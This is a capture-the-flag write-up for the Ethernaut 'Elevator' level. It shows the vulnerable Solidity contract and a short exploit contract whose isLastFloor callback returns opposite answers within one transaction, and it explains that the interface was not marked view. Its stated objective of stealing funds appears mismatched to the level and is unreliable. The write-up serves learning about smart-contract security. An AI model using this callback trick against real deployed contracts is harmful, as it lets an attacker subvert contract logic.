# Ethernaut: 11. Elevator

> This elevator won't let you reach the top of your building. Right?

**Objective of CTF:**

- Steal all the funds from the contract.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

In this level, we will write the `Builder` contract which the elevator interacts with. However, in the same transaction we will return opposite boolean results for `isLastFloor` function.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external;
}

contract Building {
  bool toggleMe = true;

  function isLastFloor(uint) external returns (bool) {
    toggleMe = !toggleMe;
    return toggleMe;
  }

  function callElevator(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }

}
```

The problem here is that Elevator did not specify `isLastFloor` to be a `view` function, which would prevent us from modifying the state like this. Another attack approach would be to return different results depending on the input data _without_ modifying state, such as via `gasLeft()`.
